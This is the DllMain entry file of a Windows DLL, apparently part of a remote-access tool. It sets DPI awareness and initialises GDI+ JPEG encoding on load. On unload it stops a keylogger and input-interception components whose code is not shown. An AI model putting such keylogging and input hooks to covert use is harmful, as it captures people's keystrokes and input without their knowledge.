// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "gdiplus_jpeg.h"
#include "remote_input_interception.h"
#include "remote_keylogger.h"

/* Opt-out of DPI virtualization so monitor/cursor math uses physical pixels.
 * Must run early (before windows are created / metrics are cached). */
static void remote_enable_dpi_awareness(void) {
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* PFN_SetProcessDpiAwarenessContext)(HANDLE);
        PFN_SetProcessDpiAwarenessContext pSetCtx =
            (PFN_SetProcessDpiAwarenessContext)GetProcAddress(hUser32, "SetProcessDpiAwarenessContext");
        if (pSetCtx) {
            /* Prefer Per-Monitor v2, fall back to Per-Monitor, then System-aware. */
            if (pSetCtx((HANDLE)-4) /* DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 */) {
                OutputDebugStringA("[remote] DPI: SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2) OK\n");
                return;
            }
            if (pSetCtx((HANDLE)-3) /* DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE */) {
                OutputDebugStringA("[remote] DPI: SetProcessDpiAwarenessContext(PER_MONITOR_AWARE) OK\n");
                return;
            }
            if (pSetCtx((HANDLE)-2) /* DPI_AWARENESS_CONTEXT_SYSTEM_AWARE */) {
                OutputDebugStringA("[remote] DPI: SetProcessDpiAwarenessContext(SYSTEM_AWARE) OK\n");
                return;
            }
            OutputDebugStringA("[remote] DPI: SetProcessDpiAwarenessContext failed\n");
            return;
        }
    }

    /* Legacy fallback (Windows 8.1+). */
    HMODULE hShcore = LoadLibraryW(L"shcore.dll");
    if (hShcore) {
        typedef HRESULT(WINAPI* PFN_SetProcessDpiAwareness)(int);
        PFN_SetProcessDpiAwareness pSet =
            (PFN_SetProcessDpiAwareness)GetProcAddress(hShcore, "SetProcessDpiAwareness");
        if (pSet) {
            /* 2 = PROCESS_PER_MONITOR_DPI_AWARE */
            if (SUCCEEDED(pSet(2))) {
                OutputDebugStringA("[remote] DPI: shcore!SetProcessDpiAwareness(PER_MONITOR) OK\n");
            } else {
                OutputDebugStringA("[remote] DPI: shcore!SetProcessDpiAwareness failed\n");
            }
        }
        FreeLibrary(hShcore);
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringA("[remote] DllMain DLL_PROCESS_ATTACH\n");
        remote_enable_dpi_awareness();
        gdiplus_jpeg_init();
        OutputDebugStringA("[remote] DllMain GDI+ init done\n");
        break;
    case DLL_PROCESS_DETACH:
        remote_keylogger_stop();
        remote_input_interception_shutdown();
        gdiplus_jpeg_shutdown();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

